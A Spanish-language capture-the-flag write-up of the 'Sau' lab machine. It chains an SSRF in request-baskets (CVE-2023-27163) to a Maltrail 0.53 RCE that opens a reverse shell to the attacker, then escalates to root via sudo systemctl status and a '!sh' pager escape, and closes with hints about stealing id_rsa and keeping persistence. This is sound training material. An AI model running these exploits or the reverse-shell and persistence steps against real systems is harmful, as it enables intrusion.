# Resolución maquina sau

**Autor:** PepeMaquina  
**Fecha:** 10 de octubre de 2025  
**Dificultad:** Easy  
**Sistema Operativo:** Linux  
**Tags:** Web, CVE, Sudo

---

## Imagen de la Máquina
![[sau.jpg]]
*Imagen: Sau.JPG*

## Reconocimiento Inicial

### Escaneo de Puertos
Comenzamos con un escaneo completo de nmap para identificar servicios expuestos:
~~~ bash
sudo nmap -p- --open -sS -vvv --min-rate 4000 -n -Pn 10.10.11.224 -oG networked
~~~
Luego queda realizar un escaneo detallado de puertos abiertos:
~~~ bash
sudo nmap -sCV -p22,55555 10.10.11.224 -oN targeted
~~~
### Enumeración de Servicios
~~~ 
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
55555/tcp open  http    Golang net/http server
| http-title: Request Baskets
|_Requested resource was /web
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Fri, 10 Oct 2025 17:18:31 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Fri, 10 Oct 2025 17:18:05 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Fri, 10 Oct 2025 17:18:09 GMT
|     Content-Length: 0
|   OfficeScan: 
|     HTTP/1.1 400 Bad Request: missing required Host header
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request: missing required Host header
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port55555-TCP:V=7.95%I=7%D=10/10%Time=68E93FCC%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,A2,"HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/html;
SF:\x20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Fri,\x2010\x20Oct\x2
SF:02025\x2017:18:05\x20GMT\r\nContent-Length:\x2027\r\n\r\n<a\x20href=\"/
SF:web\">Found</a>\.\n\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20R
SF:equest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\
SF:x20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,60,"HTTP/1\.0\x20
SF:200\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Fri,\x2010\x20Oct\x2
SF:02025\x2017:18:09\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPReques
SF:t,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain
SF:;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request
SF:")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
SF:ntent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n
SF:\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,EA,"HTTP/1\.0\x20400\x2
SF:0Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-C
SF:ontent-Type-Options:\x20nosniff\r\nDate:\x20Fri,\x2010\x20Oct\x202025\x
SF:2017:18:31\x20GMT\r\nContent-Length:\x2075\r\n\r\ninvalid\x20basket\x20
SF:name;\x20the\x20name\x20does\x20not\x20match\x20pattern:\x20\^\[\\w\\d\
SF:\-_\\\.\]{1,250}\$\n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Reque
SF:st\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20c
SF:lose\r\n\r\n400\x20Bad\x20Request")%r(SIPOptions,67,"HTTP/1\.1\x20400\x
SF:20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCo
SF:nnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Socks5,67,"HTTP/1\.
SF:1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=u
SF:tf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(OfficeSca
SF:n,A3,"HTTP/1\.1\x20400\x20Bad\x20Request:\x20missing\x20required\x20Hos
SF:t\x20header\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnect
SF:ion:\x20close\r\n\r\n400\x20Bad\x20Request:\x20missing\x20required\x20H
SF:ost\x20header");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~
### Enumeración dentro de la pagina web
La enumeración de nmap menciono un puerto 55555, al revisar esto en el navegador se ve una aplicación web ya definida con una version establecida "request-baskets Version: 1.2.1 "
![[sau2.jpg]]
Siempre que veo una versión en alguna aplicación web lo primero que hago es buscar algun cve que ya exista, porque "para que reinventar la rueda si ya existe"

### CVE-2023-27163
Al revisar en internet, se encontró una gran variedad de formas para explotar esta vulnerabilidad, para ello encontré 2 formas:
- La primera es la opción facil donde hay un exploit especifica para la maquina (https://github.com/mathias-mrsn/request-baskets-v121-ssrf), bien esta no es la manera intencionada por lo que se pasa a la segunda forma.
- La segunda es revisar paso a paso como funciona el exploit, siguiendo la guia de un repositorio (https://github.com/J0ey17/Exploit_CVE-2023-27163)
Siguiendo el paso a paso, lo primero es crear un "basket" en la pagina original.
![[sau3.jpg]]
Al crear esto, al parecer existe un ssrf en algún lado, revisando las opciones se encontro alguno que puede ser vulnerable, para probar la vulnerabilidad se redirige a mi direccion ip y ver que le llega alguna péticion.
![[sau4.jpg]]
Primero abriendo un servidor web en mi maquina atacante y redigiendo el acceso al basket, se puede ver mi servidor de descarga, comprobando asi que se tiene un ssrf a la direccion ip que configuramos.
~~~ 
python3 -m http.server 80
~~~
![[sau5.jpg]]
Entonces ahora toca redirigir la a un puerto interno donde se este hosteando una aplicación web interna, lo ideal seria fuzzearlo ya sea con burp suite y la utilidad "intruder" o FUZZ, en esta ocasión estimo los puertos que normalmente se utilizarian como el 80, 443, 8080, 8000.
Probando con el puerto 80.
![[sau6.jpg]]
![[sau7.jpg]]
Se puede ver que es una aplicación de Maltrail corriendo como una versión 0.53, como siempre reviso esta versión en internet en busca de alguna vulnerabilidad.
Se encontró una poc para realizar un RCE (https://github.com/Rubioo02/Maltrail-v0.53-RCE), probando esto en la maquina atacante, se obtiene acceso mediante una reverse shell.
~~~
./exploit.sh -t http://10.10.11.224:55555/5xpq7fd -i 10.10.x.x   
[*] Start listen from ip 10.10.x.x on port 4444

nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.11.224] 50758
$ id
uid=1001(puma) gid=1001(puma) groups=1001(puma)
~~~
Obteniendo asi finalmente acceso a la maquina.

---
## User Flag

> **Valor de la Flag:** `<Averiguelo usted mismo>`

### User Flag
Con acceso al servidor, solo queda buscar la user flag.
~~~
$ cat /home/puma/user.txt
<Encuentre su propia usre flag>
~~~

---
## Escalada de Privilegios
Para la escalada de privilegios, simplemente se realiza la enumeración básica de permisos con sudo, con esto se pudo ver que se puede ejecutar un comando con un binario que podria ser bueno para explotar.
~~~
$ sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service

~~~
Viendo con GTFOBINS, esto es muy facil de explotar, ya que al colocar el comando como se lo ve, se puede ejecutar comandos internos como "!sh" y tener acceso como root.
~~~
puma@sau:/opt/maltrail$ sudo /usr/bin/systemctl status trail.service
● trail.service - Maltrail. Server of malicious traffic detection system
     Loaded: loaded (/etc/systemd/system/trail.service; enabled; vendor preset:>
     Active: active (running) since Thu 2025-10-09 03:33:23 UTC; 1 day 14h ago
       Docs: https://github.com/stamparm/maltrail#readme
             https://github.com/stamparm/maltrail/wiki
   Main PID: 899 (python3)
      Tasks: 12 (limit: 4662)
     Memory: 124.6M
     CGroup: /system.slice/trail.service
             ├─ 899 /usr/bin/python3 server.py
             ├─2919 /bin/sh -c logger -p auth.info -t "maltrail[899]" "Failed p>
             ├─2921 /bin/sh -c logger -p auth.info -t "maltrail[899]" "Failed p>
             ├─2927 bash
             ├─2929 python3 -c import socket,subprocess,os;s=socket.socket(sock>
             ├─2930 sh
             ├─2958 script /dev/null -c bash
             ├─2959 bash
             ├─3033 sudo /usr/bin/systemctl status trail.service
             ├─3034 /usr/bin/systemctl status trail.service
             └─3035 pager

Oct 10 17:52:43 sau sudo[2941]:     puma : TTY=pts/0 ; PWD=/home/puma ; USER=ro>
Oct 10 17:54:33 sau sudo[2945]: pam_unix(sudo:auth): authentication failure; lo>
!sh
# id
uid=0(root) gid=0(root) groups=0(root)
~~~
Con eso ya se tiene acceso como root

---
## Root Flag

> **Valor de la Flag:** `<Averiguelo usted mismo>`

Ahora que ya se tiene acceso a root, solo es cosa de leer la root flag, o si fuera un caso real, leer el id_rsa o mantener persistencia de alguna otra forma, como crear una llave ssh publica o como se desee.
~~~bash
cat root/root.txt
<Encuentre su propia root flag>
~~~
De esa forma, se logro obtener la root flag.
🎉 Sistema completamente comprometido - Root obtenido

